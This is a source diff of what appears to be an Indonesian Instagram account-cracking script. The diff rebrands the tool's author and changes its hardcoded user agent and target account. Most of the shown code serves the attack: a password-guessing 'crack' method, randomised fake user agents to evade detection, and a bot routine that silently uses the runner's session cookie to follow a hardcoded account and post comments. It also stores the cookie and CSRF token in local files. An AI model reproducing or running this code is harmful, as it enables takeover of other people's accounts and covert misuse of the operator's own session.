@@ -28,7 +28,7 @@ B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
 N = '\x1b[0m'    # WARNA MATI
-ua_ig = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
+ua_ig = "Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)"
 komen = random.choice(["programmers bang?","Bakso kontoll","Panutan ku!","keren suhu♥"])
 
 def CetakBanner(ulfahsadiyah,asu):
@@ -41,7 +41,7 @@ def banner():
     CetakBanner('''[bold white]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╦╔═╗
 ╠╩╗╠╦╝║ ║ ║ ║╣   ║║ ╦
 ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╩╚═╝
-( Di buat oleh [bold green]BAJOFFICIAL [bold white]) ''','color(8)')
+( Di buat oleh [bold green]khamdihi [bold white]) ''','color(8)')
 
 def masuk():
     os.system('clear');banner()
@@ -85,7 +85,7 @@ def bot(ku_jangan_di_ganti_asu,token):
               }
               data = {
                  "comment_text": komen}
-              posh = xyzu.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("59135208259"), headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
+              posh = xyzu.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("54599387361"), headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
               posx = xyzu.post("https://i.instagram.com/api/v1/web/comments/2900156663158162275/add/", data=data, headers=head, cookies={"cookie":ku_jangan_di_ganti_asu})
               open('data/cokie.txt','w').write(ku_jangan_di_ganti_asu)
               open('data/csrftoken.txt','w').write(token)
@@ -257,8 +257,7 @@ class dump:
         x = random.randint(80,120)
         u = float(random.randint(1,12))
         a = random.randint(6,12)
-        return (f'
-        Mozilla/5.0 (Linux; Android {random.randint(6,12)}; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36')
+        return (f'Mozilla/5.0 (Linux; Android {random.randint(6,12)}; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36')
 
     def crack(self, user, pwx):
         global ok,cp,loop
